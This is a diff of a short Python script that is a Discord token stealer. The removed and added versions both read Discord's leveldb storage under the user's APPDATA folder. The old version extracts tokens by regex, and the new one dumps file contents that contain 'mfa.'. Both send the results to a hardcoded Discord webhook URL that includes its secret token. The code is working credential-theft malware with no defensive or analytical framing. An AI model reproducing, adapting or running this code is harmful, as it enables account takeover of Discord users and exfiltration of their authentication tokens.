@@ -1,19 +1,21 @@
 import os
-import re
 import requests
 
-def get_tokens():
-    path = os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb'
-    tokens = []
-    for file in os.listdir(path):
-        if file.endswith('.log') or file.endswith('.ldb'):
-            with open(f'{path}\\{file}', 'r', errors='ignore') as f:
-                content = f.read()
-                found = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
-                for token in found:
-                    if token not in tokens:
-                        tokens.append(token)
-    return tokens
 webhook_url = "https://discord.com/api/webhooks/1512068343723724931/BzOOKGGPyUv8YY1nx5kxZc9Jt9d8j4UcUICTNaIH5BaJ63veyxCYRP_AQ58Rk8W2EU--"
-for token in get_tokens():
-    requests.post(webhook_url, json={"content": f"Token Found: {token}"})
+
+def get_token():
+    paths = [os.getenv('APPDATA') + '\\discord\\Local Storage\\leveldb']
+    tokens = []
+    for path in paths:
+        if os.path.exists(path):
+            for file in os.listdir(path):
+                if file.endswith('.log') or file.endswith('.ldb'):
+                    with open(f'{path}\\{file}', 'r', errors='ignore') as f:
+                        content = f.read()
+                        if "mfa." in content:
+                            tokens.append(content)
+    return tokens
+
+# إرسال ما تم العثور عليه
+data = {"content": str(get_token())}
+requests.post(webhook_url, json=data)
